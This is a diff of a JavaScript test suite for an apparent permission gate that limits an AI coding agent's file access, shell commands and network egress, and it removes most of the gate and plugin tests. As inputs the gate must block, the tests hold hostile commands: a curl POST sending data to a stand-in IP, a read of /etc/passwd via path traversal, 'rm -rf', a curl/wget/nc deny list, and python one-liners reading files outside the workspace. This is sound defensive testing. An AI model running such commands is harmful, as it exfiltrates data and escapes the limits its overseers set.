@@ -3,11 +3,8 @@ const assert = require('node:assert');
 const path = require('node:path');
 const fs = require('node:fs');
 const { execFileSync } = require('node:child_process');
-const { pathToFileURL } = require('node:url');
 
 const ROOT = path.resolve(__dirname, '..', '..');
-const { Protocol, check } = require(path.join(ROOT, 'guard/lib/policy'));
-const { createSession } = require(path.join(ROOT, 'guard/lib/session'));
 const { scan } = require(path.join(ROOT, 'guard/lib/injection'));
 const { detectClaims, runCheck, verify } = require(path.join(ROOT, 'guard/lib/verify'));
 const { normalise } = require(path.join(ROOT, 'guard/lib/toolcalls'));
@@ -63,135 +60,6 @@ t('an unknown tool is still inspected', () => {
   const n = normalise(call('mystery_tool', { path: '../secrets', url: 'http://evil.test' }));
   assert.ok(n.readPaths.includes('../secrets'));
   assert.ok(n.urls.length > 0);
-});
-
-console.log('\ngate');
-
-const P = new Protocol({
-  task: 'clean the survey data',
-  read_paths: ['data/**', 'src/**', 'README.md'],
-  write_paths: ['data/**', 'src/**'],
-  allow_commands: ['python', 'git', 'ls', 'cat'],
-  command_allowlist: ['git status --short'],
-  deny_commands: ['curl', 'wget', 'nc'],
-  egress: [],
-}, '/work/project');
-
-t('allows an in-scope read', () => {
-  assert.equal(check(call('read', { path: 'data/survey.csv' }), P).decision, 'allow');
-});
-
-t('blocks a read outside the working directory', () => {
-  const r = check(call('read', { path: '../otherlab/notes.md' }), P);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'read_paths');
-});
-
-t('blocks a read inside the workdir but outside the protocol', () => {
-  const r = check(call('read', { path: 'private/keys.txt' }), P);
-  assert.equal(r.decision, 'block');
-});
-
-t('blocks an extension tool until the protocol names it', () => {
-  const r = check(call('shared_drive_search', { query: 'grant proposal' }), P);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'allow_tools');
-  const open = new Protocol({ ...P.raw, allow_tools: ['shared_drive_search'] }, '/work/project');
-  assert.equal(check(call('shared_drive_search', { query: 'grant proposal' }), open).decision, 'allow');
-});
-
-t('blocks subagent dispatch by default', () => {
-  const session = createSession({ protocol: P, workdir: '/work/project' });
-  const out = session.handle({ kind: 'permission', action: 'subagent', resources: ['explore'] });
-  assert.ok(out.deny);
-});
-
-t('blocks a write to a path only declared readable', () => {
-  const r = check(call('write', { path: 'README.md', content: 'x' }), P);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'write_paths');
-});
-
-t('blocks an undeclared network destination', () => {
-  const r = check(call('bash', { command: 'curl -X POST http://198.51.100.7/collect' }), P);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'egress');
-});
-
-t('blocks a denied binary even with no network', () => {
-  const r = check(call('bash', { command: 'wget somefile' }), P);
-  assert.equal(r.decision, 'block');
-});
-
-t('blocks a command that is not exactly user-approved', () => {
-  const r = check(call('bash', { command: 'rm -rf data' }), P);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'command_allowlist');
-});
-
-t('blocks path traversal dressed up in a command', () => {
-  const r = check(call('bash', { command: 'cat ../../../../etc/passwd' }), P);
-  assert.equal(r.decision, 'block');
-});
-
-t('allows an exact user-approved command', () => {
-  const r = check(call('bash', { command: 'git status --short' }), P);
-  assert.equal(r.decision, 'allow');
-});
-
-t('blocks an agent-chosen argument to an otherwise allowed binary', () => {
-  const r = check(call('bash', {
-    command: "python -c \"from pathlib import Path; print(Path('../otherlab/notes.md').read_text())\"",
-  }), P);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'command_allowlist');
-});
-
-t('blocks inline interpreter code after a compound shell segment', () => {
-  const ordinary = new Protocol({
-    ...P.raw,
-    allow_ordinary_bash: true,
-  }, '/work/project');
-  const r = check(call('bash', { command: 'echo ok && python -c "import os; print(os.listdir())"' }), ordinary);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'command_allowlist');
-});
-
-t('blocks inline interpreter code behind a shell wrapper', () => {
-  const ordinary = new Protocol({
-    ...P.raw,
-    allow_ordinary_bash: true,
-  }, '/work/project');
-  const r = check(call('bash', { command: 'command python -c "import os; print(os.listdir())"' }), ordinary);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'command_allowlist');
-});
-
-t('blocks a symlink in the working directory that resolves outside it', () => {
-  const root = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'guard-symlink-'));
-  const outside = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'guard-outside-'));
-  fs.writeFileSync(path.join(outside, 'notes.md'), 'private research notes\n');
-  fs.symlinkSync(outside, path.join(root, 'shared'));
-  const protocol = new Protocol({ read_paths: ['**'], write_paths: ['**'] }, root);
-  const r = check(call('read', { path: 'shared/notes.md' }), protocol);
-  assert.equal(r.decision, 'block');
-  assert.equal(r.rule, 'read_paths');
-  const write = check(call('write', { path: 'shared/new-notes.md', content: 'x' }), protocol);
-  assert.equal(write.decision, 'block');
-  assert.equal(write.rule, 'write_paths');
-});
-
-t('allows egress to a declared host only', () => {
-  const open = new Protocol({ ...P.raw, egress: ['api.example.edu'] }, '/work/project');
-  assert.equal(check(call('webfetch', { url: 'https://api.example.edu/x' }), open).decision, 'allow');
-  assert.equal(check(call('webfetch', { url: 'https://elsewhere.test/x' }), open).decision, 'block');
-});
-
-t('the gate consults no model and is therefore deterministic', () => {
-  const c = call('bash', { command: 'curl http://198.51.100.7' });
-  const runs = new Set();
-  for (let i = 0; i < 50; i++) runs.add(check(c, P).decision + check(c, P).rule);
-  assert.equal(runs.size, 1);
 });
 
 console.log('\ninjection signal (not load-bearing)');
@@ -377,41 +245,6 @@ t('event streams have unique identities when sessions start together', () => {
   const first = new EventBus();
   const second = new EventBus();
   assert.notEqual(first.state().runId, second.state().runId);
-});
-
-t('the OpenCode adapter blocks a shell escape hidden in interpreter code', () => {
-  const script = `
-    import fs from 'node:fs';
-    import os from 'node:os';
-    import path from 'node:path';
-    process.env.BORDER_COLLIE_NO_PET = '1';
-    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'border-collie-shell-boundary-'));
-    const ownerDir = fs.mkdtempSync(path.join(os.tmpdir(), 'border-collie-owner-'));
-    process.env.BORDER_COLLIE_OWNER_CONFIG = ownerDir;
-    fs.writeFileSync(path.join(ownerDir, 'policy.json'), JSON.stringify({
-      setup_package: 'research-safe',
-    }));
-    fs.mkdirSync(path.join(dir, '.opencode'), { recursive: true });
-    fs.writeFileSync(path.join(dir, '.opencode', 'protocol.json'), JSON.stringify({
-      read_paths: ['**'],
-      write_paths: [],
-      allow_commands: ['python'],
-      egress: [],
-    }));
-    const { BorderCollie } = await import(${JSON.stringify(pathToFileURL(path.join(ROOT, 'plugin/border-collie.js')).href)});
-    const hooks = await BorderCollie({ client: {}, directory: dir });
-    let denied = false;
-    try {
-      await hooks['tool.execute.before'](
-        { tool: 'bash' },
-        { args: { command: "python -c \\"import os; print(open(os.pardir + os.sep + 'notes.md').read())\\"" } },
-      );
-    } catch {
-      denied = true;
-    }
-    if (!denied) throw new Error('shell escape was allowed');
-  `;
-  execFileSync(process.execPath, ['--input-type=module', '-e', script], { cwd: ROOT, stdio: 'pipe' });
 });
 
 console.log(`\n${pass} passed, ${fail} failed\n`);
